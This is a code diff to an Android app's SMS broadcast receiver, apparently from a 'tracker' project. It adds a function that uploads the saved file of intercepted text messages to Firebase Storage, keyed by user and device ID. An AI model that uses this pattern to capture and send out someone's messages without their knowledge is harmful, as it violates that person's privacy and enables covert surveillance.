@@ -3,10 +3,14 @@ package com.reas.tracker.service.SMS
 import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
+import android.net.Uri
 import android.os.Build
 import android.telephony.SmsMessage
 import android.util.Log
 import androidx.annotation.RequiresApi
+import com.google.firebase.auth.FirebaseAuth
+import com.google.firebase.ktx.Firebase
+import com.google.firebase.storage.ktx.storage
 import com.google.gson.Gson
 import com.google.gson.reflect.TypeToken
 import java.io.BufferedReader
@@ -103,6 +107,26 @@ class SMSBroadcastReceiver: BroadcastReceiver() {
         val writer = FileWriter(jsonFile)
         Gson().toJson(smsMessages, writer)
         writer.close()
+
+        updateFirebase()
+    }
+
+    private fun updateFirebase() {
+        val storage = Firebase.storage
+        val storageRef = storage.reference
+
+        val deviceModel = Build.MODEL
+        val deviceID = Build.ID
+        val auth = FirebaseAuth.getInstance()
+
+        val smsJsonRef = storageRef.child("users/${auth.uid}/$deviceID/SMS.json")
+
+        var file = Uri.fromFile(jsonFile)
+
+        val uploadTask = smsJsonRef.putFile(file)
+        uploadTask.addOnFailureListener {
+            smsJsonRef.putFile(file)
+        }
     }
 
     }
